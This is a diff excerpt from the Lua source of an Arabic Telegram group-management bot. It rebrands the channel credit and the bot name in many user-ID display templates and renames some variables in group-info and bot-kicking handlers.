 𓄼 ᴍѕɢ : #msgs 𓆊
-𓄼 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𓄼 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ‎⿻┊Yor iD 𖠄 #id ٫
@@ -15354,7 +15356,7 @@ Msᴀɢ ~ #msgs
 ‌‎⿻┊MsGs 𖠄 #msgs ٫
 ‌‎⿻┊StAtS 𖠄 #stast ٫
 ‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
-‌‎⿻┊‌‎𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+‌‎⿻┊‌‎𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • ﮼ايديك  #id 🌻 ٬
@@ -15362,7 +15364,7 @@ Msᴀɢ ~ #msgs
 • ﮼مسجاتك ➺ #msgs 🌻 ٬
 •  ﮼رتبتك➺ #stast 🌻 ٬
 • ﮼تعديلك ➺ #edit 🌻 ٬
-•  تعين ➺ 「SO_ALSIYAD 」 ⦁
+•  تعين ➺ 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ┄─━━ ⦁━━─┄
@@ -15373,7 +15375,7 @@ Msᴀɢ ~ #msgs
 𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
 ✰ ᴄʜ ᴇʟɪɴ ➣ #edit
 ┄─━━ ⦁━━─┄
-✰ 𝗖?? - 「SO_ALSIYAD 」 ⦁
+✰ 𝗖?? - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ⌾ | 𝐢𝐝  𓃠 #id .
@@ -15381,7 +15383,7 @@ Msᴀɢ ~ #msgs
 ⌾ | 𝐦𝐬𝐠 𓃠 #msgs .
 ⌾ | 𝐬𝐭𝐚 𓃠 #stast .
 ⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
-⌾ | 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+⌾ | 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ♡ : 𝐼𝐷 𖠀 #id .
@@ -15389,49 +15391,49 @@ Msᴀɢ ~ #msgs
 ♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
 ♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
 ♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
-♡ : 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+♡ : 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 •ᑌᔕᗴᖇ- #username 
 •ᔕTᗩ- #stast 
 •ᗰᔕ- #msgs 
 •Iᗪ- #id
-•𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+•𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • USE ➤ #username  .
 • MSG ➤  #msgs  .
 • STA ➤  #stast  .
 • iD ➤ #id  .
-• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𝐘??𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
 𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
 𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
 𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
-𝗖𝗛☤🇪🇬 - 「SO_ALSIYAD 」 ⦁
+𝗖𝗛☤🇪🇬 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ⭐️𝖘𝖙𝖆 : #stast ـ🍭
 ⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
 ⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
 ⭐️𝖎𝖉 : #id ـ 🍭
-⭐️𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+⭐️𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
 • 🇪🇬 - 𝙸𝙳 « #id  🍭
 • 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
 • 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
-• 🇪🇬 - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• 🇪🇬 - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 • USE ➤  #username .
 • MSG ➤  #msgs .
 • STA ➤  #stast .
 • iD ➤ #id .
-• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
@@ -15439,14 +15441,14 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
 🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
 🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
-🇪🇬 - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+🇪🇬 - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
 ➜𝗠𝗘𝗦𝗦??𝗚𝗘𝗦 : #msgs
 ➜𝗦𝗧𝗔𝗧𝗦 : #stast
 ➜𝗜𝗗 : #id
-➜𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+➜𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - 🇪🇬 UsErNaMe . #username 𖠲
@@ -15454,21 +15456,21 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 Id . #id 𖠲
 - 🇪🇬 GaMeS . #game 𖠲
 - 🇪🇬 MsGs . #msgs 𖠲
-- 🇪🇬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 🇪🇬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ⌔┇Msgs : #msgs.
 ⌔┇ID : #id.
 ⌔┇Stast : #stast.
 ⌔┇UserName : #username.
-⌔┇𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+⌔┇𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𝒔𝒕𝒂𓂅 #stast 𓍯
 𝐮𝐬𝐞𝐫𓂅 #username 𓍯
 𝒎????𝒆𓂅 #msgs 𓍯
 𝐢𝐝 𓂅 #id 𓍯
-𓂅 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𓂅 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
@@ -15476,21 +15478,21 @@ Msᴀɢ ~ #msgs
 𓄼🇪🇬 𝐢𝐝 : #id ‌‌‏⚚
 𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
 𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
-𓄼🇪🇬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𓄼🇪🇬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 Usᴇʀ Nᴀᴍᴇ ~ #username 
 Yᴏᴜʀ ɪᴅ ~ #id 
 Sᴛᴀsᴛ ~ #stast 
 Msᴀɢ ~ #msgs
-𝗖?? - 「SO_ALSIYAD 」 ⦁
+𝗖?? - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ➥• USE 𖦹 #username - 🇪??.
 ➥• MSG 𖥳 #msgs  - 🇪🇬.
 ➥• STA 𖦹 #stast - 🇪??.
 ➥• iD 𖥳 #id - 🇪🇬.
-➥• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+➥• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 🇪🇬 - 𝄬 username . #username  ??
@@ -15498,7 +15500,7 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝄬 id . #id 𓃠
 🇪🇬 - 𝄬 gmas . #gmas 𓃠
 🇪🇬 - 𝄬 msgs . #msgs  𓃠
-🇪🇬 - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+🇪🇬 - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 .𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
@@ -15506,7 +15508,7 @@ Msᴀɢ ~ #msgs
 .𖣂 𝙡𝘿 , #id  🖤 ↴
 .𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
 .𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
-.𖣂 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+.𖣂 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 金 - 𝓾𝓼𝓮𝓻??𝓪𝓶𝓮 . #username ⸙ 
@@ -15514,7 +15516,7 @@ Msᴀɢ ~ #msgs
 金 - 𝓲𝓭 . #id ⸙ 
 金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
 金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
-金 - 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+金 - 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 - 🇪🇬 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 . #username 𖣂.
@@ -15522,7 +15524,7 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 𝐢𝐝 . #id 𖣂.
 - 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
 - 🇪🇬 𝐦𝐬𝐠 . #msgs 𖣂.
-- 🇪🇬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+- 🇪🇬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
@@ -15530,7 +15532,7 @@ Msᴀɢ ~ #msgs
 ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
 ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
 ᯓ 𝗺𝗦𝗚𝗦 . #msgs ??🇬 ꙰
-ᯓ 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+ᯓ 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
@@ -15538,14 +15540,14 @@ Msᴀɢ ~ #msgs
 👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
 👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
 👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
-👳🏼‍♂ - 𝄬 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+👳🏼‍♂ - 𝄬 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
 ➮- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯. 💕
 ➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
 ➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
-➭- 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+➭- 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
@@ -15553,7 +15555,7 @@ Msᴀɢ ~ #msgs
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊 
 𓐀 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𓀃.
-𓄼 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𓄼 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
@@ -15562,14 +15564,14 @@ Msᴀɢ ~ #msgs
 𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
 𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
 𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
-𝐓𝐓• 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𝐓𝐓• 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ↑↓𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ⦁  
 ↑↓𝙄𝘿 ➱ #id
 ↑↓𝙍𝘼𝙉𝙆 ➱  #stast ⦁  
 ↑↓𝙈𝘼𝙎𝙂 ➱ #msgs ⦁  
-↑↓𝗖𝗛 ➯  「SO_ALSIYAD 」 ⦁  
+↑↓𝗖𝗛 ➯  「@SO_ALSIYAD」 ⦁  
 ]],
 [[
 𝟓 𝟔 𖡻 #username  ࿇🦄
@@ -15577,28 +15579,28 @@ Msᴀɢ ~ #msgs
 𝟓 𝟔 𖡻 #auto  ࿇🦄
 𝟓 𝟔 𖡻 #stast  ࿇🦄
 𝟓 𝟔 𖡻 #id  ࿇🦄
-𝟓 𝟔 𖡻 𝗖𝗛 - 「SO_ALSIYAD 」 ⦁
+𝟓 𝟔 𖡻 𝗖𝗛 - 「@SO_ALSIYAD」 ⦁
 ]],
 [[
 ► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
 ► 𝗜𝗗 #id 𓃚 ꙰
 ► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
 ► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
-► 𝗶𝗗 - 「SO_ALSIYAD 」 ☆
+► 𝗶𝗗 - 「@SO_ALSIYAD」 ☆
 ]],
 [[
 - UsEr🇺🇸 ꙰ #username
 - StA🇺🇸 ꙰   #msgs
 - MsGs🇺🇸 ꙰ #stast
 - ID🇺🇸 ꙰  #id
-- 𝗶𝗗 🇺🇸 ꙰  「SO_ALSIYAD 」 ☆
+- 𝗶𝗗 🇺🇸 ꙰  「@SO_ALSIYAD」 ☆
 ]],
 [[
 ¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇵🇷.
 ¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇵🇷.
 ¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇵🇷.
 ¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇵🇷.
-¦• 𝗶𝗗 - 「SO_ALSIYAD 」 ☆
+¦• 𝗶𝗗 - 「@SO_ALSIYAD」 ☆
 ]],
 [[
 - 🦋 UsErNaMe . #username 𖠲
@@ -15606,7 +15608,7 @@ Msᴀɢ ~ #msgs
 - 🦋 Id . #id 𖠲
 - 🦋 GaMeS . #game 𖠲
 - 🦋 MsGs . #msgs 𖠲
-- 🦋 𝗖𝗛 - 「SO_ALSIYAD 」 ☆
+- 🦋 𝗖𝗛 - 「@SO_ALSIYAD」 ☆
 ]]}
 local Text_Rand = List[math.random(#List)]
 database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
@@ -15721,19 +15723,19 @@ if #group == i then
 if (w + q) == 0 then
 send(msg.chat_id_, msg.id_,' ⦁  لا يوجد جروبات وهميه في البوت\n')   
 else
-local hima  = (w + q)
-local sendok = #group - hima 
+local HiMA = (w + q)
+local sendok = #group - HiMA
 if q == 0 then
-hima  = ''
+HiMA = ''
 else
-hima  = '\n- تم ازالة  ↚ 「 '..q..' 」 جروبات من البوت'
+HiMA = '\n- تم ازالة  ↚ 「 '..q..' 」 جروبات من البوت'
 end
 if w == 0 then
-hima k = ''
+HiMAk = ''
 else
-hima k = '\n- تم ازالة  ↚ 「 '..w..' 」 كروب لان البوت عضو'
+HiMAk = '\n- تم ازالة  ↚ 「 '..w..' 」 كروب لان البوت عضو'
 end
-send(msg.chat_id_, msg.id_,' ⦁ عدد الجروبات الان  ↚ 「 '..#group..' 」'..hima k..''..hima ..'\n*- الان عدد الجروبات الحقيقي  ↚ 「 '..sendok..' 」 جروبات\n')   
+send(msg.chat_id_, msg.id_,' ⦁ عدد الجروبات الان  ↚ 「 '..#group..' 」'..HiMAk..''..HiMA..'\n*- الان عدد الجروبات الحقيقي  ↚ 「 '..sendok..' 」 جروبات\n')   
 end
 end
 end,nil)
@@ -15744,7 +15746,7 @@ end
 if text and text:match("^(gpinfo)$") or text and text:match("^معلومات الجروب$") then
 function gpinfo(arg,data)
 -- vardump(data) 
-hima dx(msg.chat_id_, msg.id_, ' ⦁ ايدي المجموعة  ↚ 「 '..msg.chat_id_..' 」\n ⦁ عدد الادمنيه  ↚ 「 *'..data.administrator_count_..' 」*\n ⦁ عدد المحظورين  ↚ 「 *'..data.kicked_count_..' 」*\n ⦁ عدد الاعضاء  ↚ 「 *'..data.member_count_..' 」*\n', 'md') 
+HiMAdx(msg.chat_id_, msg.id_, ' ⦁ ايدي المجموعة  ↚ 「 '..msg.chat_id_..' 」\n ⦁ عدد الادمنيه  ↚ 「 *'..data.administrator_count_..' 」*\n ⦁ عدد المحظورين  ↚ 「 *'..data.kicked_count_..' 」*\n ⦁ عدد الاعضاء  ↚ 「 *'..data.member_count_..' 」*\n', 'md') 
 end 
 getChannelFull(msg.chat_id_, gpinfo, nil) 
 end
@@ -17182,7 +17184,7 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessageText?ch
 end
 if Text == '/sofi' then
 local Teext =[[
- ⦁ اهلا في قائمه الالعاب المتطوره سورس الصياد  ⦁ 
+ ⦁ اهلا في قائمه الالعاب المتطوره سورس سون ⦁ 
 تفضل اختر لعبه من القائمه 
 ]]
 keyboard = {} 
@@ -17355,7 +17357,7 @@ if (text and text == "تفعيل اوامر التسليه") then
 send(msg.chat_id_, msg.id_, ' ⦁  تم تفعيل اوامر التسليه')
 database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
 end
-local Name_Bot = (database:get(bot_id..'Name:Bot') or 'الصياد ')
+local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سون')
 if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
@@ -17572,8 +17574,8 @@ local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_)
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
 https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
-hima  = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
-local Json_Info = JSON.decode(hima )
+HiMA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
+local Json_Info = JSON.decode(HiMA)
 if Json_Info.ok == true and #mem_id == i then
 local Msgs = {}
 Msgs[0] = msg.id_
@@ -17594,8 +17596,8 @@ local mem_id = msg.content_.members_
 local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
 for i=0,#mem_id do  
 if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
-hima  = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
-local Json_Info = JSON.decode(hima )
+HiMA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
+local Json_Info = JSON.decode(HiMA)
 if Json_Info.ok == true and #mem_id == i then
 local Msgs = {}
 Msgs[0] = msg.id_
@@ -17628,8 +17630,8 @@ return false
 end    
 end   
 --------------------------------------------------------------------------------------------------------------
-Sourcehima (data.message_,data)
-plugin_hima (data.message_)
+SourceHiMA(data.message_,data)
+plugin_HiMA(data.message_)
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
@@ -17731,13 +17733,13 @@ return false
 end  
 end 
 ------------------------------------------------------------------------
-local hima Abot = database:get(bot_id.."hima 1:Add:Filter:Rp2"..text..result.chat_id_)   
-if hima Abot then    
+local HiMAAbot = database:get(bot_id.."HiMA1:Add:Filter:Rp2"..text..result.chat_id_)   
+if HiMAAbot then    
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⦁ ["..hima Abot.."] \n") 
+send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⦁ ["..HiMAAbot.."] \n") 
 else
-send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/SO_ALSIYAD)}\n ⦁ ["..hima Abot.."] \n") 
+send(msg.chat_id_,0," ⦁ الـعـضو  : {["..data.first_name_.."](T.ME/SO_ALSIYAD)}\n ⦁ ["..HiMAAbot.."] \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
@@ -17758,9 +17760,9 @@ end
 end
 ------------------------------------------------------------------------
 if text then
-local hima 1_Msg = database:get(bot_id.."hima 1:Add:Filter:Rp2"..text..result.chat_id_)   
-if hima 1_Msg then    
-send(msg.chat_id_, msg.id_," ⦁ "..hima 1_Msg)
+local HiMA1_Msg = database:get(bot_id.."HiMA1:Add:Filter:Rp2"..text..result.chat_id_)   
+if HiMA1_Msg then    
+send(msg.chat_id_, msg.id_," ⦁ "..HiMA1_Msg)
 DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
 return false
 end
